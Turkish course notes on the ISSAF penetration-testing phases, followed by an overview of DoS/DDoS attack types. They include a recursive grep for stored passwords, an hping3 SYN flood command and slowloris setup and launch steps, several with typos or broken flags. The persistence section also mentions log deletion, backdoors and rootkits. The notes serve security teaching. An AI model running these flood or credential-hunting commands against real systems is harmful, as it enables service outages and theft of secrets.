# 30- ISSAF Raporlama Adımları

> ### 1. Bilgi Toplama
 Amaç, hedef sistem hakkında olabildiğince detaylı bilgi toplamaktır. Bu bilgiler firma hakkında olabileceği gibi firma çalışanları hakkında da  olabilir.
> ### 2. Ağ Haritalaması
 Amaç hedef sistemin ağ yapısının detaylı belirlenmesidir. Açık sistemler ve üzerindeki açık portlar, servisler ve servislerin hangi yazılımın hangi sürümü olduğu bilgileri, ağ girişlerinde bulunan VPN, Firewall, IPS cihazlarının belirlenmesi, sunucu sistemler çalışan işletim sistemlerinin ve versiyonlarının belirlenmesi ve tüm bu bileşenler belirlendikten sonra hedef sisteme ait ağ haritasının çıkartılması Ağ haritalama adımlarında yapılmaktadır. Ağ haritalama bir aktif bilgi toplama yöntemidir. Ağ haritalama esnasında hedef sistemde IPS, WAF ve benzeri savunma sistemlerinin olup olmadığı da belirlenmeli ve gerçekleştirilecek sızma testleri buna göre güncellenmelidir.
> ### 3. Zafiyet Analizi
 Bu sürecin amacı  belirlenen hedef sistemlerdeki açıklıkların ortaya çıkarılmasıdır. Bunun için sunucu servislerdeki bannerler ilk aşamada kullanılabilir. Ek olarak birden fazla zayıflık tarama aracı ile bu sistemler ayrı ayrı taranarak oluşabilecek false positive oranı düşürülmeye çalışılır. Bu aşamada hedef sisteme zarar vermeycek taramalar gerçekleştirilir.
> ### 4. Sisteme Sızma
 Belirlenen açıklıklar için POC kodları/araçları belirlenerek denelemeler başlatılır. Açıklık için uygun araç yoksa ve imkan varsa ve test için yeteri kadar zaman verilmişse sıfırdan yazılır. Genellikle bu tip araçların yazımı için Python, Ruby gibi betik dilleri tercih edilir. Bu adımda dikkat edilmesi gereken en önemli husus çalıştırılacak exploitlerden önce mutlaka yazılı onay alınması ve mümkünse lab ortamlarında önceden denenmesidir.
> ### 5. Yetkilendirme
 Sızma sürecinde amaç sisteme bir şekilde giriş hakkı elde etmektir. Bu süreçten sonra sistemdeki kullanıcının haklarının arttırılması hedeflenmelidir. Linux sistemlerde çekirdek (kernel) versiyonunun incelenerek priv. escelation zafiyetlerinin belirlenmesi ve varsa kullanılarak root haklarına erişilmesi en klasik hak yükseltme adımlarından biridir. Sistemdeki kullanıcıların ve haklarının belirlenmesi, parolasız kullanıcı hesaplarının belirlenmesi, parolaya sahip hesapların uygun araçlarla parolalarının bulunması bu adımın önemli bileşenlerindendir. Hak Yükseltme adımında amaç edinilen herhangi bir sistem hesabı ile tam yetkili bir kullanıcı moduna geçişttir.(root, administrator, system vs)
> ### 6. Diğer Ağlara Sızma
 Erişim yapılan sistemlerden şifreli kullanıcı bilgilerinin alınarak daha hızlı bir ortamda denenmesi.  Sızılan  sistemde sniffer çalıştırılabiliyorsa  ana sisteme erişim yapan diğer kullanıcı/sistem bilgilerinin elde edilmesi. Sistemde bulunan çevresel değişkenler ve çeşitli network bilgilerinin kaydedilerek sonraki süreçlerde kullanılmasıdır. Linux sistemlerde en temel örnek olarak grep komutu kullanılabilir. ```grep parola|password|sifre|onemli_kelime -R /```
> ### 7. Erişimi Sürdürme
Sisteme girildiğinin başkaları tarafından belirlenmemesi için bazı önlemlerin alınmasında fayda vardır.  Bunlar giriş loglarının silinmesi, çalıştırılan  ek proseslerin saklı olması , dışarıya erişim açılacaksa  gizli kanalların kullanılması(covert channel), backdoor, rootkit yerleştirilmesi vs.
> ### 8. İzleri Silme
 Hedef sistemlere bırakılmış arka kapılar, test amaçlı scriptler, sızma testleri için eklenmiş tüm veriler not alınmalı ve test bitiminde silinmelidir
> ### 9. Raporlama
Raporlar ne kadar açık ve detaylı/bilgilendirici olursa müşterinin riski değerlendirmesi ve açıklıkları gidermesi  de o kadar kolay olur. Testler esnasında çıkan kritik güvenlik açıklıklarının belgelenerek sözlü olarak anında bildirilmesi test yapan takımın görevlerindendir. Bildirimin ardından açıklığın hızlıca giderilmei için çözüm önerilerinin de birlikte sunulması gerekir. Ayrıca raporların teknik, yönetim ve özet olmak üzere üç  farklı şekilde hazırlanmasında fayda vardır. Teknik raporda hangi uygulama/araçların kullanıldığı, testin yapıldığı tarihler ve çalışma zamanı,  bulunan açıklıkların detayları  ve açıklıkların en hızlı ve kolay yoldan giderilmesini amaçlayan tavsiyeler bulunmalıdır.  
  
# 31-DOS ve DDOS

### Protokoller

1. ```IP```: Internet Protocol
2. ```HTTP```: Hypertext Transfer Protocol
3. ```TCP```: Transmission Control Protocol
4. ```UDP```: User Datagram Protocol
5. ```ICMP```: Internet Control Message Protocol

```Traceroute```-> IP paketinin hedefe ulaşana kadar nerelerden geçtiğini gösterir

### Saldırı Türleri

> ### Volumetrik Saldırılar

```UDP```: Temel portlarına çok sayıda UDP paketi yollanamasıdır

```ICMP```: **Smurf saldırı** ve **pink flood** saldırılarıdır

```Reflection Amplification Saldırıları```

! ```ICMP```'den korunmak için **bant genişliği arttırılabilir** veya **paket sayısı ve boyutu kısıtlanabilir**

> ### Protokol Saldırıları

```SYN FLOOD```: En çok kullanılan DDOS saldırı tipidir
```
hping3 -c 15000 -d 120 -S -w 64 -o 80 --flood --rand -source 192.168.123.123

* -c: Paket Sayısı
* -d: Data Büyüklüğü
* -S: SYN
* -w: Windows bit boyutu
* -p: Destport
* -source: IP Adresi
```

```HTTP FLOOD``` 

```SLOWLORIS```
``` 
git clone https://githubcom/gkbrk/slowloris.git
servise apache 2 start
cd slowloris
python3 slowloris 192.168.123.123 -s 500 (-s paket sayısı)
```
